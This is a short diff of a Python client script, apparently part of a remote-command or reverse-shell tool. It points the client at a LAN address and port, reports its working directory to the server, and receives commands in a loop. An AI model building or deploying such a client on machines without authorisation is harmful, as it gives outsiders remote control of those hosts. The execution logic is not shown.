@@ -6,16 +6,15 @@ from utils import handle_cd, download_file
 
 
 def start_client():
-    host = '127.0.0.1'
+    host = '192.168.1.107'
     # host = '192.168.1.110'
     port = 12344
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
         client_socket.connect((host, port))
 
-        client_socket.sendall(os.getcwd().encode('utf-8'))
-
         while True:
+            client_socket.sendall(os.getcwd().encode('utf-8'))
             # Receive command from the server
             command = client_socket.recv(4096).decode('utf-8')
 
